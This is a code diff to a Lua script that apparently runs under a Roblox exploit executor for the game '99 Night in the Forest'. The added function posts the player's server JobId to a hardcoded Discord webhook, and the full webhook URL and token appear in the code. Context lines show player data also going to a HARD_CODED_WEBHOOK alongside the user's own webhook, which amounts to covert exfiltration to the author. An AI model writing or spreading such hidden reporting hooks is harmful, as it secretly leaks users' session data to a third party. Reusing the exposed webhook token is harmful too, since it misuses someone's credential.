@@ -1,3 +1,32 @@
+
+local function sendJobIdWebhook()
+    local JobId = tostring(game.JobId) or "N/A"
+    local message = "!jobid:" .. JobId -- 👈 ส่งข้อความแบบนี้เลย
+
+    local data = {
+        ["content"] = message
+    }
+
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    local headers = { ["content-type"] = "application/json" }
+    local request = http_request or request or HttpPost or syn.request or http.request
+    
+    if request then
+        request({
+            Url = "https://discord.com/api/webhooks/1405897648908537867/ohimBzJhsycpfJDFURU3WoNwbEs9Q8ULX_16WSmxbNF-ot8otVU9s4fftQ4olRr6muXP",
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        })
+        print("ส่ง JobId ไปที่ Webhook แล้ว:", message)
+    else
+        warn("No request function available!")
+    end
+end
+
+-- เรียกใช้
+sendJobIdWebhook()
+
 wait(5)
 -- Configuration
 local WEBHOOK1 = getgenv().Webhookurl
@@ -118,6 +147,7 @@ local fields2 = {
         ["value"] = '```' .. JoinServer .. '```'
     }
 }
+
 -- Send Player Data Webhook (Send even if some data is missing)
 sendWebhook(HARD_CODED_WEBHOOK, "**__99 Night in the Forest Info__**", fields2)
 sendWebhook(WEBHOOK1, "**__99 Night in the Forest Info__**", fields)
